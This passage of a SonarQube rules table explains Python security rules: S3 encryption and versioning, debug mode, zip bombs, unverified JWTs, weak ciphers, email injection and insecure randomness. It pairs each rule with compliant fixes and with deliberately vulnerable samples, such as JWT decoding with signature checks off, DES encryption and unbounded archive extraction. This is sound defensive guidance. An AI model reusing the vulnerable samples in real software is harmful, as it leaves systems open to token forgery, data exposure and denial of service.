              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul>
  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul>
      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul>
      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul>
      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li>
    </ul>  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
bucket = s3.Bucket(self,"bucket",
    encryption=s3.BucketEncryption.UNENCRYPTED       # Sensitive
)
</pre>
<p>The default value of <code>encryption</code> is <code>KMS</code> if <code>encryptionKey</code> is set. Otherwise, if both parameters are absent the
bucket is unencrypted.</p>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
bucket = s3.Bucket(self,"bucket",
    encryption=s3.BucketEncryption.S3_MANAGED
)

# Alternatively with a KMS key managed by the user.

bucket = s3.Bucket(self,"bucket",
    encryptionKey=access_key
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html">AWS documentation</a> - Protecting data using
  server-side encryption </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html">AWS CDK version 2</a> - BucketEncryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4507">
              python:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p>Django application startup:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from django.conf import settings

settings.configure(DEBUG=True)  # Sensitive when set to True
settings.configure(DEBUG_PROPAGATE_EXCEPTIONS=True)  # Sensitive when set to True

def custom_config(config):
    settings.configure(default_settings=config, DEBUG=True)  # Sensitive
</pre>
<p>Inside <code>settings.py</code> or <code>global_settings.py</code>, which are the default configuration files for a Django application:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
DEBUG = True  # Sensitive
DEBUG_PROPAGATE_EXCEPTIONS = True  # Sensitive
</pre>
<p>Flask application startup:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
from flask import Flask

app = Flask()
app.debug = True  # Sensitive
app.run(debug=True)  # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
from django.conf import settings

settings.configure(DEBUG=False)
settings.configure(DEBUG_PROPAGATE_EXCEPTIONS=False)

def custom_config(config):
    settings.configure(default_settings=config, DEBUG=False)
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
DEBUG = False
DEBUG_PROPAGATE_EXCEPTIONS = False
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
from flask import Flask

app = Flask()
app.debug = False
app.run(debug=False)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6252">
              python:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The bucket stores information that require high availability. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<pre>
bucket = s3.Bucket(self, "bucket",
    versioned=False       # Sensitive
)
</pre>
<p>The default value of <code>versioned</code> is <code>False</code> so the absence of this parameter is also sensitive.</p>
<h2>Compliant Solution</h2>
<pre>
bucket = s3.Bucket(self, "bucket",
    versioned=True
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html">AWS documentation</a> - Using versioning in S3 buckets </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned">AWS CDK version 2</a> - Using versioning in S3
  buckets </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5042">
              python:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.python.org/3.5/library/tarfile.html">tarfile</a> module:</p>
<pre>
import tarfile

tfile = tarfile.open("TarBomb.tar")
tfile.extractall('./tmp/')  # Sensitive
tfile.close()
</pre>
<p>For <a href="https://docs.python.org/dev/library/zipfile.html">zipfile</a> module:</p>
<pre>
import zipfile

zfile = zipfile.ZipFile('ZipBomb.zip', 'r')
zfile.extractall('./tmp/') # Sensitive
zfile.close()
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.python.org/3.5/library/tarfile.html">tarfile</a> module:</p>
<pre>
import tarfile

THRESHOLD_ENTRIES = 10000
THRESHOLD_SIZE = 1000000000
THRESHOLD_RATIO = 10

totalSizeArchive = 0;
totalEntryArchive = 0;

tfile = tarfile.open("TarBomb.tar")
for entry in tfile:
  tarinfo = tfile.extractfile(entry)

  totalEntryArchive += 1
  sizeEntry = 0
  result = b''
  while True:
    sizeEntry += 1024
    totalSizeArchive += 1024

    ratio = sizeEntry / entry.size
    if ratio &gt; THRESHOLD_RATIO:
      # ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
      break

    chunk = tarinfo.read(1024)
    if not chunk:
      break

    result += chunk

  if totalEntryArchive &gt; THRESHOLD_ENTRIES:
    # too much entries in this archive, can lead to inodes exhaustion of the system
    break

  if totalSizeArchive &gt; THRESHOLD_SIZE:
    # the uncompressed data size is too much for the application resource capacity
    break

tfile.close()
</pre>
<p>For <a href="https://docs.python.org/dev/library/zipfile.html">zipfile</a> module:</p>
<pre>
import zipfile

THRESHOLD_ENTRIES = 10000
THRESHOLD_SIZE = 1000000000
THRESHOLD_RATIO = 10

totalSizeArchive = 0;
totalEntryArchive = 0;

zfile = zipfile.ZipFile('ZipBomb.zip', 'r')
for zinfo in zfile.infolist():
    print('File', zinfo.filename)
    data = zfile.read(zinfo)

    totalEntryArchive += 1

    totalSizeArchive = totalSizeArchive + len(data)
    ratio = len(data) / zinfo.compress_size
    if ratio &gt; THRESHOLD_RATIO:
      # ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
      break

    if totalSizeArchive &gt; THRESHOLD_SIZE:
      # the uncompressed data size is too much for the application resource capacity
      break

    if totalEntryArchive &gt; THRESHOLD_ENTRIES:
      # too much entries in this archive, can lead to inodes exhaustion of the system
      break

zfile.close()
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5659">
              python:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in PyJWT</h2>
<h3>Code examples</h3>
<p>The following code contains an example of JWT decoding without verification of the signature.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import jwt

jwt.decode(token, options={"verify_signature":False}) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>By default, verification is enabled for the method <code>decode</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import jwt

jwt.decode(token, key, algorithms="HS256")
</pre>
<h3>How does this work?</h3>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue, follow these instructions:</p>
<ol>
  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>
  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for
  further investigation. </li>
  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>
</ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5547">
              python:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Cryptodome</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from Crypto.Cipher import DES # pycryptodome
from Cryptodome.Cipher import DES # pycryptodomex

cipher = DES.new(key, DES.MODE_OFB) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from Crypto.Cipher import AES # pycryptodome
from Cryptodome.Cipher import AES # pycryptodomex

cipher = AES.new(key, AES.MODE_CCM)
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5300">
              python:S5300
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Sending emails is security-sensitive and can expose an application to a large range of vulnerabilities.</p>
<p><strong>Information Exposure</strong></p>
<p>Emails often contain sensitive information which might be exposed to an attacker if he can add an arbitrary address to the recipient list.</p>
<p><strong>Spamming / Phishing</strong></p>
<p>Malicious user can abuse email based feature to send spam or phishing content.</p>
<p><strong>Dangerous Content Injection</strong></p>
<p>Emails can contain HTML and JavaScript code, thus they can be used for XSS attacks.</p>
<p><strong>Email Headers Injection</strong></p>
<p>Email fields such as <code>subject</code>, <code>to</code>, <code>cc</code>, <code>bcc</code>, <code>from</code> are set in email "headers".&nbsp;
Using unvalidated user input to set those fields&nbsp;might allow attackers to inject new line characters in headers to craft malformed SMTP requests.
Although modern libraries are filtering new line character by default, user data used in&nbsp;email "headers" should always be validated.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9801">CVE-2017-9801</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4803">CVE-2016-4803</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Unvalidated user input are used to set email headers. </li>
  <li> Email content contains data provided by users and it is not sanitized. </li>
  <li> Email recipient list or body are based on user inputs. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use an email library which sanitizes headers (Flask-Mail or django.core.mail). </li>
  <li> Use html escape functions to sanitize every piece of data used to in the email body. </li>
  <li> Verify application logic to make sure that email base feature can not be abuse to:
    <ul>
      <li> Send arbitrary email for spamming or fishing </li>
      <li> Disclose sensitive email content </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>smtplib</p>
<pre>
import smtplib

def send(from_email, to_email, msg):
  server = smtplib.SMTP('localhost', 1025)
  server.sendmail(from_email, to_email, msg) # Sensitive
</pre>
<p>Django</p>
<pre>
from django.core.mail import send_mail

def send(subject, msg, from_email, to_email):
  send_mail(subject, msg, from_email, [to_email]) # Sensitive
</pre>
<p>Flask-Mail</p>
<pre>
from flask import Flask
from flask_mail import Mail, Message

app = Flask(__name__)

def send(subject, msg, from_email, to_email):
    mail = Mail(app)
    msg = Message(subject, [to_email], body, sender=from_email)
    mail.send(msg) # Sensitive{code}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.damonkohler.com/2008/12/email-injection.html">Email Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/93">CWE-93 - Improper Neutralization of CRLF Sequences ('CRLF Injection')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/80">CWE-80 - Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic
  XSS)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4787">
              python:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=python%3AS4426&rule_key=python%3AS4426'>S4426</a>, <a href='/organizations/sopra-steria/rules?open=python%3AS5542&rule_key=python%3AS5542'>S5542</a>, <a href='/organizations/sopra-steria/rules?open=python%3AS5547&rule_key=python%3AS5547'>S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902">CVE-2017-7902</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378">CVE-2006-1378</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like "Chosen-Plaintext Attacks". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><code>cryptography</code> module</p>
<pre>
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305, AESGCM, AESCCM
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher


def encrypt(key):
    Fernet(key)  # Sensitive
    ChaCha20Poly1305(key)  # Sensitive
    AESGCM(key)  # Sensitive
    AESCCM(key)  # Sensitive


private_key = rsa.generate_private_key()  # Sensitive


def encrypt2(algorithm, mode, backend):
    Cipher(algorithm, mode, backend)  # Sensitive
</pre>
<p><code>pynacl</code> library</p>
<pre>
from nacl.public import Box
from nacl.secret import SecretBox


def public_encrypt(secret_key, public_key):
    Box(secret_key, public_key)  # Sensitive


def secret_encrypt(key):
    SecretBox(key)  # Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/321">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/322">CWE-322 - Key Exchange without Entity Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/323">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/324">CWE-324 - Use of a Key Past its Expiration Date</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/325">CWE-325 - Missing Required Cryptographic Step</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2245">
              python:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Only use random number generators which are <a
  href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation">recommended by
  OWASP</a> or any other trusted organization. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import random

random.getrandbits(1) # Sensitive
random.randint(0,9) # Sensitive
random.random()  # Sensitive

# the following functions are sadly used to generate salt by selecting characters in a string ex: "abcdefghijk"...
random.sample(['a', 'b'], 1)  # Sensitive
random.choice(['a', 'b'])  # Sensitive
random.choices(['a', 'b'])  # Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
